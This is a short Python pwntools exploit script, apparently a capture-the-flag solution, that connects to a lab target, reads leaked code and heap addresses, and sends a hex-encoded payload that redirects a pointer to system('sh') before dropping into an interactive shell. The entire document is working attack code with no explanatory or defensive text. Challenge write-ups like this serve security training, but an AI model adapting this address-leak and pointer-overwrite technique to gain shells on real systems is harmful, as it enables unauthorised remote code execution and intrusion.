from pwn import *

context.log_level = "debug"


ip = "2710334860d7.target.yijinglab.com"
port = 52918
p = remote(ip, port)


def hexstr(data):
    return "HEX:" + "".join("{:02x}".format(b) for b in data)


p.recvuntil(b"[LEAK] addr1=")
text_base = int(p.recv(18), 16)
p.recvuntil(b"addr2=")
chunk_addr = int(p.recv(18), 16)
log.info(f"text_base={hex(text_base)} chunk_addr={hex(chunk_addr)}")


system_addr = text_base + 0x1130
binsh_addr = chunk_addr + 0x120


payload = b"sh\x00\x00" + p32(system_addr) + b"a" * (0x100 - 4 - 4)
payload += p32(chunk_addr + 4)
payload += b";sh\x00"

p.sendline(hexstr(payload).encode())
p.interactive()
